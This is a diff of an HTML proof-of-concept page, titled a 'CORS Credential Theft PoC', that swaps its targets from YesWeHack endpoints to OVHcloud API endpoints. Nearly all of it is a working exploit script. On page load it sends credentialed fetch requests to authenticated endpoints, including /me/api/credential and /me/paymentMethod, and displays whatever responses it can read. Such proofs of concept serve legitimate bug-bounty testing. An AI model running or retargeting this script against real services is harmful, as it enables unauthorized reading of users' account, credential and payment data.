@@ -1,61 +1,45 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <meta charset="utf-8">
-  <title>YesWeHack CORS Exploit PoC</title>
+  <title>OVH CORS PoC</title>
   <style>
-    body { font-family: Arial, sans-serif; background: #111; color: #0f0; padding: 20px; }
-    pre  { background: #000; padding: 10px; border: 1px solid #0f0; white-space: pre-wrap; }
-    h2   { color: #0f0; }
+    body { background:#000; color:#0f0; font-family: monospace; padding:20px; }
+    pre { border:1px solid #0f0; padding:10px; }
   </style>
 </head>
 <body>
+<h2>OVHcloud CORS Credential Theft PoC</h2>
+<p>If this page (served from a non-OVH domain) can read authenticated OVH API responses, CORS is broken.</p>
 
-<h2>YesWeHack CORS Credential Theft PoC</h2>
-<p>
-  If this page (on a third-party origin) can read your YesWeHack responses,
-  CORS is misconfigured and allows theft of authenticated data.
-</p>
-
-<pre id="output">Running PoC…</pre>
+<pre id="out">Running…</pre>
 
 <script>
-async function attack() {
-  const output = document.getElementById('output');
+async function run() {
+  const out = document.getElementById("out");
+  let text = "";
 
   const endpoints = [
-    "https://yeswehack.com/programs",
-    "https://yeswehack.com/profile",
-    "https://api.yeswehack.com/me",
-    "https://api.yeswehack.com/programs",
-    "https://apps.yeswehack.com/",
+    "https://api.ovh.com/1.0/me",
+    "https://api.ovh.com/1.0/me/api/credential",
+    "https://api.ovh.com/1.0/me/order",
+    "https://api.ovh.com/1.0/me/paymentMethod",
+    "https://api.ovh.com/1.0/me/notification/email",
+    "https://api.ovh.com/1.0/me/services"
   ];
-
-  let results = "";
 
   for (const url of endpoints) {
     try {
-      const res = await fetch(url, {
-        method: "GET",
-        credentials: "include"
-      });
-
-      const text = await res.text(); // works for JSON, HTML, errors, whatever
-
-      results += `==============================\n`;
-      results += `[${url}] STATUS: ${res.status}\n`;
-      results += `${text.slice(0, 4000)}\n\n`; // truncate to keep PoC readable
+      const res = await fetch(url, { method: "GET", credentials: "include" });
+      const body = await res.text();
+      text += `===== ${url} =====\nSTATUS: ${res.status}\n${body}\n\n`;
     } catch (err) {
-      results += `==============================\n`;
-      results += `[${url}] ERROR: ${err}\n\n`;
+      text += `===== ${url} =====\nERROR: ${err}\n\n`;
     }
   }
 
-  output.textContent = results;
+  out.textContent = text;
 }
-
-attack();
+run();
 </script>
-
 </body>
 </html>
